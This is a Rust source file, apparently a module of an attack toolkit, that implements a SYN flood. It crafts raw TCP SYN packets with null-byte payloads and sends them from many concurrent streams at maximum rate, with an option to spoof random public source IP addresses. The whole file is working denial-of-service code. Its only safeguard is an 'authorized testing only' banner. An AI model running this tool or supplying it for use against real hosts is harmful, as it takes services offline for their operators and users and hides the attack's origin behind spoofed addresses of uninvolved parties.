//! Null SYN Exhaustion Testing Module
//!
//! Opens concurrent SYN connections sending null-byte streams for resource exhaustion testing.
//! FOR AUTHORIZED TESTING ONLY.

use anyhow::{anyhow, Context, Result};
use colored::*;
use pnet_packet::ip::IpNextHeaderProtocols;
use pnet_packet::ipv4::{self, MutableIpv4Packet};
use pnet_packet::tcp::{self, MutableTcpPacket, TcpFlags};
use rand::Rng;
use socket2::{Domain, Protocol, Socket, Type};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;
use tokio::time::Instant;
use crate::utils::{
    normalize_target, prompt_default, prompt_port, prompt_required, prompt_yes_no,
};

/// Configuration for the exhaustion test
#[derive(Clone, Debug)]
struct ExhaustionConfig {
    target_ip: Ipv4Addr,
    target_port: u16,
    source_port: Option<u16>,
    use_random_source_ip: bool,
    concurrent_streams: usize,
    duration_secs: u64,
    interval_mode: IntervalMode,
    payload_size: usize,
}

#[derive(Clone, Debug)]
enum IntervalMode {
    Zero,           // Max speed, no delay
    Delay(u64),     // Delay in milliseconds
}

/// Entry point for the module
pub async fn run(initial_target: &str) -> Result<()> {
    display_banner();
    
    let config = gather_config(initial_target).await?;
    execute_exhaustion(&config).await
}

fn display_banner() {
    println!("{}", r#"
╔══════════════════════════════════════════════════════════════╗
║   Null SYN Exhaustion Testing Module                         ║
║   FOR AUTHORIZED TESTING ONLY                                ║
╚══════════════════════════════════════════════════════════════╝
"#.red().bold());
}

async fn gather_config(initial_target: &str) -> Result<ExhaustionConfig> {
    println!("{}", "=== Configuration ===".bold());
    
    // Target IP
    let target_input = if initial_target.trim().is_empty() {
        prompt_required("Target IP")?
    } else {
        println!("{}", format!("[*] Using target: {}", initial_target).cyan());
        initial_target.to_string()
    };
    
    let normalized = normalize_target(&target_input)?;
    let target_ip: Ipv4Addr = normalized.parse()
        .map_err(|_| anyhow!("Target must be a valid IPv4 address (IPv6 not supported for raw packets)"))?;
    
    // Target Port
    let target_port = prompt_port("Target port", 80)?;
    
    // Source Port (optional)
    let src_port_input = prompt_default("Source port (blank for random)", "")?;
    let source_port = if src_port_input.is_empty() {
        None
    } else {
        Some(src_port_input.parse::<u16>()
            .map_err(|_| anyhow!("Invalid source port"))?)
    };
    
    // Random Source IP
    let use_random_source_ip = prompt_yes_no("Use random (spoofed) source IPs? (requires root)", false)?;
    
    // Concurrent Streams
    let streams_input = prompt_default("Number of concurrent streams", "100")?;
    let concurrent_streams: usize = streams_input.parse()
        .map_err(|_| anyhow!("Invalid number"))?;
    
    if concurrent_streams == 0 {
        return Err(anyhow!("Concurrent streams must be > 0"));
    }
    
    // Duration
    let duration_input = prompt_required("Test duration (seconds)")?;
    let duration_secs: u64 = duration_input.parse()
        .map_err(|_| anyhow!("Invalid duration"))?;
    
    if duration_secs == 0 {
        return Err(anyhow!("Duration must be > 0"));
    }
    
    // Interval Mode
    let zero_interval = prompt_yes_no("Use zero interval (max speed)?", true)?;
    let interval_mode = if zero_interval {
        IntervalMode::Zero
    } else {
        let delay_input = prompt_default("Delay between packets (ms)", "10")?;
        let delay: u64 = delay_input.parse().map_err(|_| anyhow!("Invalid delay"))?;
        IntervalMode::Delay(delay)
    };
    
    // Payload Size
    let payload_input = prompt_default("Null-byte payload size", "1024")?;
    let payload_size: usize = payload_input.parse()
        .map_err(|_| anyhow!("Invalid payload size"))?;
    
    // Summary
    println!("\n{}", "=== Test Configuration ===".bold());
    println!("  Target: {}:{}", target_ip, target_port);
    println!("  Source Port: {}", source_port.map(|p| p.to_string()).unwrap_or_else(|| "random".to_string()));
    println!("  Random Source IP: {}", if use_random_source_ip { "yes" } else { "no" });
    println!("  Concurrent Streams: {}", concurrent_streams);
    println!("  Duration: {}s", duration_secs);
    println!("  Interval: {:?}", interval_mode);
    println!("  Payload Size: {} bytes", payload_size);
    
    if !prompt_yes_no("\nProceed with test?", true)? {
        return Err(anyhow!("Test cancelled by user"));
    }
    
    Ok(ExhaustionConfig {
        target_ip,
        target_port,
        source_port,
        use_random_source_ip,
        concurrent_streams,
        duration_secs,
        interval_mode,
        payload_size,
    })
}

async fn execute_exhaustion(config: &ExhaustionConfig) -> Result<()> {
    println!("\n{}", "[*] Starting Null SYN Exhaustion test...".yellow().bold());
    
    let stop_flag = Arc::new(AtomicBool::new(false));
    let packets_sent = Arc::new(AtomicU64::new(0));
    let bytes_sent = Arc::new(AtomicU64::new(0));
    
    // Resource-efficient: limit concurrent workers with semaphore
    // Use a reasonable limit to avoid FD exhaustion
    let max_concurrent = config.concurrent_streams.min(500);
    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration_secs);
    
    // Spawn stats printer
    let stats_stop = stop_flag.clone();
    let stats_packets = packets_sent.clone();
    let stats_bytes = bytes_sent.clone();
    let stats_handle = tokio::spawn(async move {
        while !stats_stop.load(Ordering::Relaxed) {
            tokio::time::sleep(Duration::from_secs(1)).await;
            let pkts = stats_packets.load(Ordering::Relaxed);
            let bytes = stats_bytes.load(Ordering::Relaxed);
            print!("\r{}", format!(
                "[*] Packets: {} | Bytes: {} KB | Rate: {:.1} pkt/s",
                pkts,
                bytes / 1024,
                pkts as f64 / start_time.elapsed().as_secs_f64()
            ).dimmed());
            let _ = std::io::Write::flush(&mut std::io::stdout());
        }
    });
    
    // Spawn worker streams
    let mut handles = Vec::new();
    
    for stream_id in 0..config.concurrent_streams {
        let config = config.clone();
        let sem = semaphore.clone();
        let stop = stop_flag.clone();
        let pkts = packets_sent.clone();
        let bts = bytes_sent.clone();
        
        let handle = tokio::spawn(async move {
            // Acquire permit (blocks if too many concurrent)
            let _permit = match sem.acquire().await {
                Ok(p) => p,
                Err(_) => return,
            };
            
            if let Err(e) = run_stream(stream_id, &config, stop, pkts, bts, start_time, duration).await {
                // Silently continue on errors (permission denied, etc.)
                if e.to_string().contains("Permission denied") || e.to_string().contains("EPERM") {
                    eprintln!("\n{}", "[!] Root privileges required for raw sockets. Run with sudo.".red().bold());
                }
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for duration
    tokio::time::sleep(duration).await;
    
    // Signal stop
    stop_flag.store(true, Ordering::Relaxed);
    
    // Wait for workers
    for handle in handles {
        let _ = handle.await;
    }
    
    stats_handle.abort();
    
    // Final stats
    let total_pkts = packets_sent.load(Ordering::Relaxed);
    let total_bytes = bytes_sent.load(Ordering::Relaxed);
    let elapsed = start_time.elapsed();
    
    println!("\n\n{}", "=== Test Complete ===".green().bold());
    println!("  Duration: {:.2}s", elapsed.as_secs_f64());
    println!("  Total Packets: {}", total_pkts);
    println!("  Total Data: {} KB", total_bytes / 1024);
    println!("  Avg Rate: {:.1} pkt/s", total_pkts as f64 / elapsed.as_secs_f64());
    
    Ok(())
}

async fn run_stream(
    _stream_id: usize,
    config: &ExhaustionConfig,
    stop: Arc<AtomicBool>,
    packets: Arc<AtomicU64>,
    bytes: Arc<AtomicU64>,
    start: Instant,
    duration: Duration,
) -> Result<()> {
    // Create raw socket
    let socket = Socket::new(
        Domain::IPV4,
        Type::RAW,
        Some(Protocol::from(libc::IPPROTO_RAW)),
    ).context("Failed to create raw socket")?;
    
    socket.set_header_included_v4(true)
        .context("Failed to set IP_HDRINCL")?;
    
    // Prepare null-byte payload
    let null_payload = vec![0u8; config.payload_size];
    
    while !stop.load(Ordering::Relaxed) && start.elapsed() < duration {
        // Generate source IP
        let src_ip = if config.use_random_source_ip {
            generate_random_ipv4()
        } else {
            get_local_ipv4().unwrap_or_else(|| Ipv4Addr::new(127, 0, 0, 1))
        };
        
        // Generate source port
        let src_port = config.source_port.unwrap_or_else(|| {
            rand::rng().random_range(49152..=65535)
        });
        
        // Craft and send SYN packet with null payload
        match send_syn_packet(&socket, src_ip, src_port, config.target_ip, config.target_port, &null_payload) {
            Ok(sent) => {
                packets.fetch_add(1, Ordering::Relaxed);
                bytes.fetch_add(sent as u64, Ordering::Relaxed);
            }
            Err(_) => {
                // Continue on errors
            }
        }
        
        // Apply interval delay
        match &config.interval_mode {
            IntervalMode::Zero => {
                // Yield to allow other tasks
                tokio::task::yield_now().await;
            }
            IntervalMode::Delay(ms) => {
                tokio::time::sleep(Duration::from_millis(*ms)).await;
            }
        }
    }
    
    Ok(())
}

fn send_syn_packet(
    socket: &Socket,
    src_ip: Ipv4Addr,
    src_port: u16,
    dst_ip: Ipv4Addr,
    dst_port: u16,
    payload: &[u8],
) -> Result<usize> {
    // TCP header + payload
    let tcp_header_len = 20;
    let tcp_total_len = tcp_header_len + payload.len();
    let mut tcp_buf = vec![0u8; tcp_total_len];
    
    {
        let mut tcp_pkt = MutableTcpPacket::new(&mut tcp_buf[..tcp_header_len])
            .ok_or_else(|| anyhow!("Failed to create TCP packet"))?;
        
        let seq_num: u32 = rand::rng().random();
        
        tcp_pkt.set_source(src_port);
        tcp_pkt.set_destination(dst_port);
        tcp_pkt.set_sequence(seq_num);
        tcp_pkt.set_acknowledgement(0);
        tcp_pkt.set_data_offset(5);
        tcp_pkt.set_flags(TcpFlags::SYN);
        tcp_pkt.set_window(65535);
        tcp_pkt.set_urgent_ptr(0);
        
        // Checksum (without payload for header)
        let tcp_immutable = tcp_pkt.to_immutable();
        tcp_pkt.set_checksum(tcp::ipv4_checksum(&tcp_immutable, &src_ip, &dst_ip));
    }
    
    // Copy payload after TCP header
    tcp_buf[tcp_header_len..].copy_from_slice(payload);
    
    // IP header
    const IPV4_HEADER_LEN: usize = 20;
    let total_len = (IPV4_HEADER_LEN + tcp_total_len) as u16;
    let mut ip_buf = vec![0u8; total_len as usize];
    
    {
        let mut ip_pkt = MutableIpv4Packet::new(&mut ip_buf)
            .ok_or_else(|| anyhow!("Failed to create IP packet"))?;
        
        let ip_id: u16 = rand::rng().random();
        
        ip_pkt.set_version(4);
        ip_pkt.set_header_length(5);
        ip_pkt.set_total_length(total_len);
        ip_pkt.set_identification(ip_id);
        ip_pkt.set_ttl(64);
        ip_pkt.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_pkt.set_source(src_ip);
        ip_pkt.set_destination(dst_ip);
        ip_pkt.set_flags(ipv4::Ipv4Flags::DontFragment);
        ip_pkt.set_payload(&tcp_buf);
        ip_pkt.set_checksum(ipv4::checksum(&ip_pkt.to_immutable()));
    }
    
    // Send
    let dst_addr = SocketAddr::new(IpAddr::V4(dst_ip), 0);
    let sent = socket.send_to(&ip_buf, &dst_addr.into())
        .context("Failed to send packet")?;
    
    Ok(sent)
}

fn generate_random_ipv4() -> Ipv4Addr {
    let mut rng = rand::rng();
    loop {
        let a: u8 = rng.random_range(1..=254);
        let b: u8 = rng.random();
        let c: u8 = rng.random();
        let d: u8 = rng.random_range(1..=254);
        
        // Avoid private/reserved ranges
        if a == 10 || a == 127 || (a == 172 && (16..=31).contains(&b)) || (a == 192 && b == 168) {
            continue;
        }
        
        return Ipv4Addr::new(a, b, c, d);
    }
}

fn get_local_ipv4() -> Option<Ipv4Addr> {
    // Try to get local IP by connecting to a known address
    use std::net::UdpSocket;
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    let addr = socket.local_addr().ok()?;
    match addr.ip() {
        IpAddr::V4(ip) => Some(ip),
        _ => None,
    }
}
